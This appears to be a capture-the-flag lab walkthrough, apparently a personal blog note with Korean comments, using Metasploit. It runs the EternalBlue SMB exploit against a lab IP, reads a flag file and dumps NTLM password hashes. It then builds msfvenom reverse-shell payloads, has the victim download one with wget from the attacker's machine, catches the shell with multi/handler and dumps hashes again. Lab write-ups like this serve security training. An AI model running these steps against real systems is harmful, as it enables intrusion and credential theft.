use use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.10
set rport 445
exploit

# meterpreter -> cmd : change to interactable shell with native command

shell

# etc

cd
dir
pwd
search -f flag.txt
type flag.txt

![](https://velog.velcdn.com/images/agnusdei1207/post/841b2d11-69ad-4a2c-b3e6-1dcfe22a113e/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/af142867-ed28-4348-9802-09e0fb636536/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/e74d0066-fe70-4808-b11e-c441694f304f/image.png)
What is the content of the flag.txt file?

![](https://velog.velcdn.com/images/agnusdei1207/post/bee7be2c-3990-444c-a2c2-63c32c46b790/image.png)
What is the NTLM hash of the password of the user "pirate"?

# hash 는 meterpeter 커맨드에서 바로 실행하기

hashdump
meterpeter> hashdump

# ip a

inet 172.17.0.1/16

# attacker host, port

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f elf > rev_shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.201.99.36 LPORT=1234 -f exe > rev_shell.exe

# In attacking machine:

python3 -m http.server 1234

In the machine being attacked:

wget http://ATTACKING_MACHINE_IP:1234/rev_shell.elf

Now remember we need a listener on our shell for RCE:

(Type these commands in the metasploit shell)

use exploit/multi/handler

set payload linux/x86/meterpreter/reverse_tcp

Now just set the LHOST and LPORT the same you did in the exploit.
Last thing to do is run that file and recieve the connection :

chmod +x rev_shell.elf in the shell we have ssh the account

Start the listener in your machine by the command told above.

Run the file by ./rev_shell.elf

You got the meterpreter reverse shell in your machine ;)

#4 Use a post exploitation module to dump hashes of other users on the system.

msfconsole

run post/linux/gather/hashdump
